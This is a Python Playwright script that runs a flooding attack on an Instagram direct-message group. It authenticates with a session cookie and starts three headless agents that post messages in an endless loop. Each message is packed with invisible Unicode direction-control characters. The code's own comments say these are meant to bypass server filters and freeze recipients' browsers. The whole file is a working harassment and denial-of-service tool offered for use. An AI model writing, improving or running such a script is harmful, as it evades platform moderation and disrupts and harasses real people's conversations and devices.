# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (GHOST-IMPACT V10)
# 📅 STATUS: FILTER-BYPASS | 20-MPS | TOTAL-LOCK

import os, asyncio, random, sys
from playwright.async_api import async_playwright

AGENT_COUNT = 3 

def get_ghost_payload(agent_id):
    """Bypasses server filters by hiding impact codes inside standard text."""
    u_id = random.randint(100, 999)
    # These are invisible 'Ghost' characters that the server ignores but browsers hate
    ghost = "\u2067\u2060\u202E" 
    
    # Branding using standard letters to bypass the 'Black Wall' filter
    name = f"P{ghost}R{ghost}A{ghost}V{ghost}E{ghost}E{ghost}R"
    status = f"O{ghost}W{ghost}N{ghost}S"
    
    # 💥 THE HEADER (Clean enough for the server, heavy enough for the CPU)
    header = f"👑 {name} {status} 👑\n⚠️ SYSTEM ERROR {u_id} ⚠️\n"
    
    # 🏗️ THE 'GHOST-WALL'
    # We repeat the 'salted' text. To the server, it looks like a poem. 
    # To the browser, it's a recursive layout nightmare.
    body = []
    for i in range(130):
        # Mixing direction isolation with standard text
        body.append(f"TEAM_DEVEL_OWNED_{ghost}_{i}")
        
    return (header + "\n".join(body))[:9980]

async def run_striker(agent_id, context, target_id):
    await asyncio.sleep(agent_id * 3) 
    page = await context.new_page()
    await page.route("**/*.{png,jpg,jpeg,svg,mp4}", lambda route: route.abort())
    
    try:
        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Deploying Ghost-Impact...")
        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="commit", timeout=120000)
        
        while True:
            try:
                box = page.get_by_role("textbox", name="Message")
                await box.wait_for(state="visible", timeout=30000)

                for _ in range(30):
                    payload = get_ghost_payload(agent_id)
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Ghost-Strike Delivered")
                    await asyncio.sleep(0.4) 
                
                await asyncio.sleep(4) 

            except Exception:
                await asyncio.sleep(5)
                if not await page.get_by_role("textbox", name="Message").is_visible():
                    await page.reload(wait_until="commit")

    except Exception as e:
        print(f"❌ [Agent-{agent_id}] Error: {str(e)[:50]}")

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        tasks = [run_striker(i+1, context, target_id) for i in range(AGENT_COUNT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
